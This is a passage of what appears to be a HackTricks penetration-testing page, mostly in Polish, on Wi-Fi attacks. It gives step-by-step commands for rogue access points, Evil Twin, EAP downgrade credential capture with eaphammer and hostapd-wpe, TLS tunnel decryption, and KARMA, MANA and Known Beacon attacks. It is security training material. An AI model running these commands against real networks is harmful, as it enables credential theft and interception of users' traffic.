```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Utwórz plik konfiguracyjny `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zatrzymaj uciążliwe procesy**, ustaw **monitor mode**, i **uruchom hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Przekazywanie i przekierowanie
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Atak Evil Twin wykorzystuje sposób, w jaki klienci WiFi rozpoznają sieci, opierając się przede wszystkim na nazwie sieci (ESSID) i nie wymagając, by base station (access point) uwierzytelniał się względem klienta. Najważniejsze aspekty obejmują:

- **Trudność w rozróżnieniu**: Urządzenia mają problem z odróżnieniem autentycznych i rogue access points, gdy mają takie samo ESSID i typ szyfrowania. Sieci w praktyce często używają wielu access points o tym samym ESSID, aby płynnie rozszerzyć zasięg.
- **Roaming klienta i manipulacja połączeniem**: Protokół 802.11 pozwala urządzeniom na roaming między access points w obrębie tego samego ESS. Atakujący mogą to wykorzystać, nakłaniając urządzenie do rozłączenia się z obecnym base station i połączenia z rogue one. Można to osiągnąć, oferując silniejszy sygnał lub zakłócając połączenie z autentycznym access point za pomocą metod takich jak deauthentication packets lub jamming.
- **Trudności w realizacji**: Przeprowadzenie evil twin attack w środowiskach z wieloma, dobrze rozmieszczonymi access points może być trudne. Deauthenticating a single legitimate access point często skutkuje połączeniem urządzenia z innym autentycznym access point, chyba że atakujący może deauthenticate wszystkie pobliskie access points lub strategicznie umieścić rogue access point.

Możesz stworzyć bardzo podstawowy Open Evil Twin (bez możliwości przekierowania ruchu do Internetu) wykonując:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Możesz też utworzyć Evil Twin za pomocą **eaphammer** (uwaga: aby tworzyć Evil Twins za pomocą **eaphammer**, interfejs **nie powinien** być w trybie **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Albo używając Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Zwróć uwagę, że domyślnie jeśli ESSID w PNL jest zapisany jako chroniony WPA, urządzenie nie połączy się automatycznie z Open evil Twin. Możesz spróbować przeprowadzić DoS na prawdziwym AP i mieć nadzieję, że użytkownik ręcznie połączy się z Twoim Open evil twin, albo możesz przeprowadzić DoS na prawdziwym AP i użyć WPA Evil Twin, by przechwycić handshake (tą metodą nie będziesz w stanie pozwolić ofierze połączyć się z tobą, ponieważ nie znasz PSK, ale możesz przechwycić handshake i spróbować go złamać).

_Niektóre OS i AV ostrzegą użytkownika, że połączenie z Open network jest niebezpieczne..._

### WPA/WPA2 Evil Twin

Możesz utworzyć **Evil Twin using WPA/2** i jeśli urządzenia są skonfigurowane tak, by łączyć się z tym SSID przy użyciu WPA/2, będą próbować się połączyć. Tak czy inaczej, **aby zakończyć 4-way-handshake** musisz także **znać** **hasło**, którego klient zamierza użyć. Jeśli **nie znasz** go, **połączenie nie zostanie zakończone**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Aby zrozumieć te ataki, zalecam najpierw przeczytać krótkie [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Korzystanie z hostapd-wpe**

`hostapd-wpe` wymaga pliku **konfiguracyjnego** do działania. Aby **zautomatyzować** generowanie tych konfiguracji, możesz użyć [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (umieść pobrany plik python w katalogu _/etc/hostapd-wpe_/)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
W pliku konfiguracyjnym możesz wybrać wiele różnych rzeczy, takich jak ssid, channel, user files, cret/key, dh parameters, wpa version i auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Korzystanie z EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Domyślnie EAPHammer używa następujących authentication methods (zwróć uwagę, że GTC jest pierwszą próbą uzyskania plaintext passwords, a następnie stosowane są bardziej odporne auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
To jest domyślna metodologia, aby uniknąć długich czasów połączenia. Możesz jednak również określić serwerowi authentication methods od najsłabszych do najsilniejszych:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ta metoda pozwala **attacker to create a malicious access point (AP) that responds to all probe requests** od urządzeń próbujących połączyć się z sieciami. Ta technika **tricks devices into connecting to an attacker's AP** przez naśladowanie sieci, których urządzenia szukają. Gdy urządzenie wyśle żądanie połączenia do tego rogue AP, połączenie zostaje nawiązane, powodując, że urządzenie błędnie połączy się z attacker's network.

### MANA

Następnie **devices started to ignore unsolid network responses**, co zmniejszyło skuteczność oryginalnego karma attack. Jednak pojawiła się nowa metoda znana jako **MANA attack**, wprowadzona przez Ian de Villiers i Dominic White. Metoda ta polega na tym, że rogue AP **capturing the Preferred Network Lists (PNL) from devices by responding to their broadcast probe requests** przy użyciu nazw sieci (SSIDs) wcześniej zapisanych przez urządzenia. Ten zaawansowany atak omija zabezpieczenia przeciwko oryginalnemu karma attack, wykorzystując sposób, w jaki urządzenia zapamiętują i priorytetyzują znane sieci.

MANA attack działa poprzez monitorowanie zarówno directed, jak i broadcast probe requests wysyłanych przez urządzenia. Dla directed requests zapisuje MAC address urządzenia oraz żądaną nazwę sieci, dodając te informacje do listy. Gdy otrzyma broadcast request, AP odpowiada informacją odpowiadającą którejkolwiek z sieci na liście urządzenia, wabiąc urządzenie do połączenia z rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Atak **Loud MANA** to zaawansowana strategia stosowana, gdy urządzenia nie używają directed probing lub gdy ich Preferred Network Lists (PNL) są nieznane atakującemu. Opiera się na zasadzie, że **urządzenia w tym samym obszarze prawdopodobnie dzielą niektóre nazwy sieci w swoich PNLs**. Zamiast odpowiadać wybiórczo, atak ten rozgłasza probe responses dla każdej nazwy sieci (ESSID) znalezionej w połączonych PNLs wszystkich obserwowanych urządzeń. Takie szerokie podejście zwiększa szansę, że urządzenie rozpozna znajomą sieć i spróbuje połączyć się z rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Kiedy **Loud MANA attack** może nie wystarczyć, **Known Beacon attack** oferuje inne podejście. Ta metoda **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** pochodzących z wordlisty. To symuluje obecność wielu sieci, mając nadzieję na dopasowanie ESSID w PNL ofiary, co powoduje próbę połączenia z sfałszowanym AP. Atak można wzmocnić, łącząc go z opcją `--loud` dla bardziej agresywnej próby złapania urządzeń.

Eaphammer zaimplementował ten atak jako MANA attack, gdzie wszystkie ESSIDs na liście są charged (możesz też połączyć to z `--loud`, aby stworzyć Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Atak **Known Beacon Burst attack** polega na **rapid-fire broadcasting of beacon frames for each ESSID listed in a file**. Powoduje to gęste środowisko fałszywych sieci, znacznie zwiększając prawdopodobieństwo, że urządzenia połączą się z rogue AP, szczególnie gdy jest to połączone z MANA attack. Ta technika wykorzystuje szybkość i skalę, aby przytłoczyć mechanizmy wyboru sieci urządzeń.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** to protokół umożliwiający urządzeniom łączenie się bezpośrednio ze sobą za pomocą Wi‑Fi bez konieczności użycia tradycyjnego punktu dostępowego. Ta funkcja jest zaimplementowana w różnych urządzeniach Internet of Things (IoT), takich jak drukarki i telewizory, ułatwiając bezpośrednią komunikację urządzenie–urządzenie. Charakterystyczną cechą Wi‑Fi Direct jest to, że jedno urządzenie przyjmuje rolę punktu dostępowego, znanego jako group owner, aby zarządzać połączeniem.

Bezpieczeństwo połączeń Wi‑Fi Direct jest zapewniane przez **Wi-Fi Protected Setup (WPS)**, który obsługuje kilka metod bezpiecznego parowania, w tym:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Te metody, w szczególności PIN entry, są podatne na te same luki co WPS w tradycyjnych sieciach Wi‑Fi, co czyni je celem podobnych wektorów ataku.

### EvilDirect Hijacking

**EvilDirect Hijacking** to atak specyficzny dla Wi‑Fi Direct. Odzwierciedla koncepcję ataku Evil Twin, ale celuje w połączenia Wi‑Fi Direct. W tym scenariuszu atakujący podszywa się pod prawowitego group ownera, aby skłonić urządzenia do połączenia z złośliwym bytem. Metodę tę można przeprowadzić za pomocą narzędzi takich jak `airbase-ng`, określając channel, ESSID i MAC address podszywanego urządzenia:

## Źródła

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Rzuć okiem na [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (logowanie przez Facebook i imitacja WPA w captive portals)

{{#include ../../banners/hacktricks-training.md}}
